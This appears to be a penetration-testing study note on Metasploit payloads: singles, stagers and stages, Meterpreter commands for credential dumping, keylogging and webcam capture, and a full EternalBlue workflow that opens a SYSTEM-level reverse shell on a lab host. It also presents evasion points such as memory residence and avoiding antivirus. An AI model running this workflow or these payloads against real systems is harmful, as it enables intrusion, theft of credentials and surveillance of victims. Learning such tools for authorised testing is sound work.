# 06 — Payloads

## Overview

A **payload** in Metasploit is a module that aids the exploit in returning a shell to the attacker. The exploit bypasses the vulnerable service's normal functioning, then the payload runs on the target OS to establish a connection back to the attacker.

---

## Three Payload Types

| Type | Description | Naming Convention |
|------|-------------|-------------------|
| **Singles** | Self-contained — exploit + entire shellcode in one package. Sent and executed in a single step. More stable but larger | `windows/shell_bind_tcp` (underscore, no `/` separator) |
| **Stagers** | Small, reliable first-stage payload. Initiates outbound connection to attacker, sets up communication channel for the Stage to be delivered | `bind_tcp`, `reverse_tcp` (the part after the `/`) |
| **Stages** | Downloaded by the Stager. Provides advanced features (Meterpreter, VNC, etc.) with no size limits | `meterpreter`, `shell`, `vncinject` (the part before the `/`) |

### How to Tell Staged vs Stageless

| Payload Name | Type | Indicator |
|-------------|------|-----------|
| `windows/shell_bind_tcp` | **Single (stageless)** | Underscore `_` — all-in-one |
| `windows/shell/bind_tcp` | **Staged** | Slash `/` — stager + stage separated |
| `windows/x64/meterpreter/reverse_tcp` | **Staged** | `meterpreter` (stage) `/` `reverse_tcp` (stager) |
| `windows/x64/meterpreter_reverse_tcp` | **Single (stageless)** | Underscore — full Meterpreter inline |

---

## How Staged Payloads Work

```
┌────────────────────────────────────────────────────────────┐
│  Stage 0 (Stager)                                          │
│  - Small initial shellcode sent via exploit                │
│  - Initializes reverse connection back to attacker         │
│  - Common names: reverse_tcp, reverse_https, bind_tcp      │
│  - Purpose: Set up communication channel                   │
├────────────────────────────────────────────────────────────┤
│  Middle Stager                                             │
│  - Handles large download (single recv() fails for big     │
│    payloads)                                               │
│  - Stager receives middle stager first                     │
│  - Middle stager performs full Stage download               │
├────────────────────────────────────────────────────────────┤
│  Stage 1 (Stage)                                           │
│  - The actual payload (Meterpreter, shell, VNC)            │
│  - Downloaded through the established channel              │
│  - Grants full shell access and advanced features          │
└────────────────────────────────────────────────────────────┘
```

### Why Reverse Connections?

- Leverages **outbound traffic rules** — firewalls are stricter on inbound
- Victim initiates the connection → bypasses inbound filtering
- Takes advantage of the **security trust zone** typically given to outbound traffic

### Windows NX Stagers Note

| Detail | Description |
|--------|-------------|
| NX CPUs + DEP | Create reliability issues for stagers |
| NX stagers | Bigger — use `VirtualAlloc` for memory |
| Default | Now NX + Win7 compatible |

---

## Meterpreter Payload

| Feature | Description |
|---------|-------------|
| **DLL Injection** | Ensures stable, persistent connection |
| **Memory-resident** | Lives entirely in RAM — no traces on hard drive |
| **Hard to detect** | Conventional forensic techniques struggle to find it |
| **Dynamic loading** | Scripts and plugins loaded/unloaded on demand |
| **Persistent** | Survives reboots and system changes |

### Meterpreter vs Standard Shell

| Meterpreter | Standard Shell (cmd/bash) |
|-------------|--------------------------|
| `getuid` | `whoami` |
| `ls`, `cd`, `cat`, `download`, `upload` | Standard OS file commands |
| `hashdump` (SAM database) | Manual extraction required |
| `screenshot`, `screenshare` | Not available |
| `keyscan_start/stop/dump` | Not available |
| `record_mic`, `webcam_snap` | Not available |
| `migrate` (process migration) | Not available |
| `shell` (drop to OS shell) | Already there |

### Key Meterpreter Command Categories

| Category | Commands |
|----------|----------|
| **Core** | `background`, `sessions`, `migrate`, `load`, `run`, `exit` |
| **File System** | `ls`, `cd`, `cat`, `download`, `upload`, `search`, `rm`, `mkdir` |
| **Networking** | `arp`, `ifconfig`, `netstat`, `portfwd`, `route` |
| **System** | `getuid`, `sysinfo`, `ps`, `kill`, `shell`, `execute`, `reg`, `clearev` |
| **User Interface** | `screenshot`, `screenshare`, `keyscan_start`, `keyscan_dump`, `keyboard_send` |
| **Webcam/Audio** | `record_mic`, `webcam_snap`, `webcam_stream`, `play` |
| **Privilege** | `getsystem`, `hashdump`, `steal_token`, `timestomp` |

---

## Searching and Selecting Payloads

### List All Payloads

```bash
msf6 > show payloads
```

### Filter with grep (inside msfconsole)

```bash
# Find all Meterpreter payloads for current module
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

# Count results
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

# Chain grep for specific payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```

### Select a Payload

```bash
# By index number
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

# By full name
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
```

> When `show payloads` is run inside an exploit module, MSF automatically filters to show only compatible payloads for the target OS.

---

## Common Windows Payloads

| Payload | Description |
|---------|-------------|
| `generic/custom` | Generic listener, multi-use |
| `generic/shell_bind_tcp` | Normal shell, TCP bind |
| `generic/shell_reverse_tcp` | Normal shell, reverse TCP |
| `windows/x64/exec` | Execute an arbitrary command |
| `windows/x64/loadlibrary` | Load an arbitrary x64 library |
| `windows/x64/messagebox` | Spawn a dialog via MessageBox |
| `windows/x64/shell_reverse_tcp` | Normal shell, single payload, reverse TCP |
| `windows/x64/shell/reverse_tcp` | Normal shell, staged, reverse TCP |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, staged, IPv6 bind TCP |
| `windows/x64/meterpreter/$` | Meterpreter + connection varieties |
| `windows/x64/powershell/$` | Interactive PowerShell sessions + varieties |
| `windows/x64/vncinject/$` | VNC Server (Reflective Injection) + varieties |

---

## Payload Configuration

### Required Parameters

| Parameter | Description | Example |
|-----------|-------------|---------|
| **LHOST** | Attacker's IP (listener address) | `10.10.14.15` |
| **LPORT** | Attacker's port (listener port) | `4444` |
| **EXITFUNC** | Exit technique after payload runs | `thread` (default) |

### Quick IP Check from msfconsole

```bash
msf6 > ifconfig
# Shows all interfaces — look for tun0 (VPN) IP
```

---

## Full Workflow Example: EternalBlue with Meterpreter

```bash
# 1. Select exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Find and set Meterpreter reverse TCP payload
msf6 exploit(...) > grep meterpreter grep reverse_tcp show payloads
msf6 exploit(...) > set payload 15
# payload => windows/x64/meterpreter/reverse_tcp

# 3. Configure
msf6 exploit(...) > set RHOSTS 10.10.10.40
msf6 exploit(...) > set LHOST 10.10.14.15

# 4. Run
msf6 exploit(...) > run

# 5. Meterpreter session opens
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

# 6. Drop to OS shell if needed
meterpreter > shell
C:\Users> whoami
# nt authority\system
```

---

## Key Takeaways

| Concept | Remember |
|---------|----------|
| **Slash = staged, underscore = stageless** | `shell/reverse_tcp` (staged) vs `shell_reverse_tcp` (single) |
| **Singles are more stable** | Everything in one package, but can be too large for some exploits |
| **Staged is more evasive** | Smaller initial payload, harder for AV to catch |
| **Meterpreter lives in memory** | No disk artifacts — hard to detect forensically |
| **`grep` chains in msfconsole** | `grep meterpreter grep reverse_tcp show payloads` narrows results fast |
| **`show payloads` inside a module** | Auto-filters to compatible payloads only |
| **Reverse > Bind** | Outbound traffic bypasses stricter inbound firewall rules |
| **`getuid` not `whoami`** | Meterpreter uses its own commands — `shell` drops to OS CLI |
| **Check LHOST carefully** | Use `ifconfig` inside msfconsole to confirm your VPN/internal IP |
